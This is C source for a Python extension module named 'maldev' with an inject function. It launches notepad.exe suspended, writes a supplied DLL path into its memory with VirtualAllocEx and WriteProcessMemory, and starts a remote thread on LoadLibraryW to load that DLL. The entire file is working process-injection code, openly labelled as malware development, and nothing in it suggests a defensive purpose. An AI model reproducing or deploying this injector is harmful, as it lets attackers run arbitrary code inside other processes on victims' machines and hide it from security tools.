#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <windows.h>
#include <stdio.h>

char notepad[] = "C:\\Windows\\system32\\notepad.exe";

static PyObject* _inject(PyObject* self, PyObject* args) {
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  HANDLE hProcess, hThread;
  HMODULE hKernel32;
  DWORD PID, TID;
  LPVOID rBuffer;

  wchar_t dllPath[MAX_PATH];
  size_t dllPathSize;
  char* dllPathStr;

  if (!PyArg_ParseTuple(args, "s", &dllPathStr)) {
    return Py_None;
  }
  
  mbstowcs(dllPath, dllPathStr, MAX_PATH);
  dllPathSize = wcslen(dllPath) * sizeof(wchar_t);

  ZeroMemory(&si, sizeof(si));
  ZeroMemory(&pi, sizeof(pi));
  si.cb = sizeof(si);

  if (!CreateProcess(NULL, notepad, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
    printf("Failed to create process: %d\n", GetLastError());
    return Py_None;
  }

  printf("Created process: %d\n", pi.dwProcessId);
  PID = pi.dwProcessId;
  
  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
  if (hProcess == NULL) {
    printf("Failed to open process: %d\n", GetLastError());
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return Py_None;
  }

  printf("Got process handle: 0x%p\n", hProcess);

  rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (rBuffer == NULL) {
    printf("Failed to allocate memory: %d\n", GetLastError());
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return Py_None;
  }

  printf("Allocated memory at: 0x%p\n", rBuffer);

  if (!WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL)) {
    printf("Failed to write memory: %d\n", GetLastError());
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return Py_None;
  }

  printf("Wrote memory\n");

  hKernel32 = GetModuleHandleW(L"Kernel32.dll");
  if (hKernel32 == NULL) {
    printf("Failed to get kernel32 handle: %d\n", GetLastError());
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hProcess);
    return Py_None;
  }

  printf("Got kernel32 handle: 0x%p\n", hKernel32);
  
  LPTHREAD_START_ROUTINE loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
  if (loadLibrary == NULL) {
    printf("Failed to get LoadLibraryW address: %d\n", GetLastError());
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hProcess);
    return Py_None;
  }

  printf("Got LoadLibraryW address: 0x%p\n", loadLibrary);

  hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibrary, rBuffer, 0, NULL);
  if (hThread == NULL) {
    printf("Failed to create remote thread: %d\n", GetLastError());
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hProcess);
    return Py_None;
  }

  printf("Created remote thread: 0x%p\n", hThread);
  WaitForSingleObject(hThread, INFINITE);

  CloseHandle(hThread);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  CloseHandle(hProcess);

  printf("Finished\n");
  return Py_None;
}

static struct PyMethodDef methods[] = {
  {"inject", (PyCFunction)_inject, METH_VARARGS, NULL},
  {NULL, NULL, 0, NULL}
};

static struct PyModuleDef module = {
  PyModuleDef_HEAD_INIT,
  "maldev",
  NULL,
  -1,
  methods
};

PyMODINIT_FUNC PyInit_maldev(void) {
  return PyModule_Create(&module);
}